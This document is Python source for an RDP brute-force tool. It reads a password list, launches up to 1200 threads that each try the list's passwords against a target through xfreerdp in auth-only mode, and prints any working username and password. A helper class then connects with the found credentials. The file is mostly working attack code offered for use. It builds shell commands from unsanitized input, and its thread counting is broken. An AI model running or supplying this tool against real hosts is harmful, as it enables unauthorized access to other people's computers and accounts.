import subprocess
import threading
import socket
import IPy
class Rdpdata:
    port = 3389
    linux_path = "/usr/bin/xfreerdp"
    linux_Ipvalue = "/v:"
    linux_Portvalue = "/port:"
    linux_Uservalue = "/u:"
    linux_Passwordvalue = "/p:"
class Rdp_breach:
    def __init__(self):
        self.port = Rdpdata.port
        self.path = Rdpdata.linux_path
        self.Ipvalue = Rdpdata.linux_Ipvalue
        self.Portvalue = Rdpdata.linux_Portvalue
        self.Uservalue = Rdpdata.linux_Uservalue
        self.Passwordvalue = Rdpdata.linux_Passwordvalue
        self.end = False
        self.Maxthread = 1200
        self.Activethreads = 0
    def Valuesfix(self, user_input):
        Foundaddress = False
        Founduser = False
        Foundpassword = False
        user_input.remove(user_input[0])
        for command in user_input:
            if "a:" in command:
                Address = command.split("a:")[1]
                Foundaddress = True
            elif "u:" in command:
                user = command.split("u:")[1]
                Founduser = True
            elif "p:" in command:
                password = command.split("p:")[1]
                Foundpassword = True
            else:
                print(f"{command}'s unknown")
                break
        if Foundpassword == True and Foundaddress == True and Founduser == True:
            print(f"====\nStarted BruteForce in..\nAddress => {Address}\nUser => {user}\nPassword list => {password}\n====")
            Rdp_breach.Cracker(self, Address, user, password)
    def Cracker(self, adress, user, password):
        file = open(password, "r")
        for passw in file.read().splitlines():
            if len(passw) != 0:
                if self.end == False:
                    while self.Activethreads > self.Maxthread:
                        ''
                    threading.Thread(target=Rdp_breach.Crack, args=[self, adress, user, passw]).start()
        if self.end == True:
            print("Brute Force ended!")
    def Crack(self, address, user, password):
        command = f"{self.path} {self.Ipvalue}{address} {self.Portvalue}{str(self.port)} {self.Uservalue}{user} {self.Passwordvalue}{password} /cert-ignore -clipboard +auth-only"
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cmd.wait()
        if cmd.returncode == 0:
            print(f"{address}: password found =>> {user}:{password}")
            self.end = True
        self.Activethreads = self.Activethreads - 1
class Rdp_connect:
    def Filter_info(self, user_input):
        user_input.remove(user_input[0])
        for command in user_input:
            if ":" in command:
                user = command.split(":")[0]
                password = command.split(":")[1]
            else:
                address = command
        try:
            Rdp_connect.connect(self, address, user, password)
        except Exception as e:
            return e
    def connect(self, address, user, password):
        print("Connecting...")
        command = f"{Rdpdata.linux_path} {Rdpdata.linux_Uservalue}{user} {Rdpdata.linux_Passwordvalue}{password} {Rdpdata.linux_Ipvalue}{address}"
        cmd = subprocess.Popen(command, shell=True)